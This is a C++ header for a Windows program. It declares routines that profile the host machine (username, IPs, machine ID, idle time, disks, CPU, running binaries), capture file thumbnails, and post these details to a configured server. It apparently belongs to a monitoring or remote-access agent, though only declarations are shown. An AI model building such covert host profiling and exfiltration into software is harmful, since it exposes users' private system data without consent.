#pragma once
#include <winsock2.h>
#include "Utils.h"
#include <Windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <map>
#include "protobufhelper/model.pb.h"
#include <intrin.h>
#include <array>
#include "stringutils.h"
#include <sstream>
#include <time.h>
#include "pdh.h"
#include "iptypes.h"
#include "thread"
#include "Request.h"
#include "Models.h"
#include <ws2tcpip.h>
#include <chrono>
#include <Shobjidl.h>
#include <Shlobj.h>

#include "capture.h"
#include <nlohmann/json.hpp>
using json = nlohmann::json;
// using namespace std::chrono;
typedef NTSYSAPI NTSTATUS (*RtlGetVersion)(PRTL_OSVERSIONINFOW *lpVersionInformation);
typedef void(WINAPI *RtlGetVersion_FUNC)(OSVERSIONINFOEXW *);
EXPORT void Start();
bool InternetIsWorking();
void WaitForConnection();
std::string GetAssetDir();
HBITMAP GetThumbnail(std::string File);
std::vector<uint8_t> CaptureFileThumbnail(std::string file);
bool UploadInfo(std::string info);
typedef struct WindowsVersion
{
    int majorVersion;
    int minorVersion;
    int buildNumber;
    int platformId;
    std::string name;
} WindowsVersion;


typedef struct Screen
{
    int width;
    int height;
} Screen;
typedef struct Disk
{
    int64_t freeSpace;
    int64_t total;
    std::string name;
} Disk;
class Information
{
private:
public:
    std::string arch;
    std::string compileTime;
    int cpuCores;
    std::map<std::string, std::string> cpuInfo;
    std::map<std::string, std::string> driveInfo;
    std::map<std::string, std::string> osInfo;
    std::string cpu;
    double cpuPercentage;
    std::vector<Disk> disks;
    std::vector<std::string> dotnetVersions;
    int64_t totalRam;
    int64_t freeRam;
    std::string userName;
    std::string hostBinary;
    bool isInteractive;
    std::string localIp;
    std::string remoteIp;
    std::string machine;
    std::string machineId;
    std::string mainBinary;
    WindowsVersion windowsVersion;
    Screen screen;
    int64_t systemTime;
    int64_t idleTime;
    Information();
    static Information getInformation();
};
bool PostMachineDetails();
WindowsVersion getWindowsVersion();
std::string GetCpuInfo();
std::map<std::string, std::string> getWmicResult(std::string cmd);

void initCPUCounter();
double getCpuPercentage();
std::vector<Disk> getDisks();


std::string getExecutingBinary();
std::string getLocalIP();
WindowsVersion getWindowsVersion();
Screen getScreenDimensions();
int64_t getSystemTime();
std::string getCompileTime();
int64_t getIdleTime();
std::string Information2JSON(Information &info);

extern const std::string SERVER_BASE;
